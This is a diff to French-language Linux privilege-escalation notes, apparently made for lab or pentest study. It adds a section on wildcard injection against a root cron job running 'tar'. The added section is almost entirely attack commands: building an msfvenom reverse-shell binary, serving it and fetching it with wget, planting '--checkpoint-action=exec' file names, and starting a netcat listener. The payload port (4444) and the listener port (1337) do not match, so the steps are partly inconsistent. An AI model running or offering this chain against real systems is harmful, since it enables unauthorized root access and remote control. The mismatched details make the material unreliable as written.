@@ -199,3 +199,34 @@ puis
 ```
 /tmp/rootbash -p
 ```
+
+## Cron Jobs - Wildcard
+
+Cas de `tar` (Cf. Crontab au dessus)
+
+```
+user@debian:~$ cat /usr/local/bin/compress.sh 
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+[Attaquant]
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+chmod +x /home/user/shell.elf
+python -m http.server
+```
+
+[Victime] (Cf. <a href="https://gtfobins.github.io/gtfobins/tar/">GTFObins</a>)
+
+```
+wget http://IP:8000/shell.elf
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+[Attaquant]
+```
+nc -lnvp 1337
+```
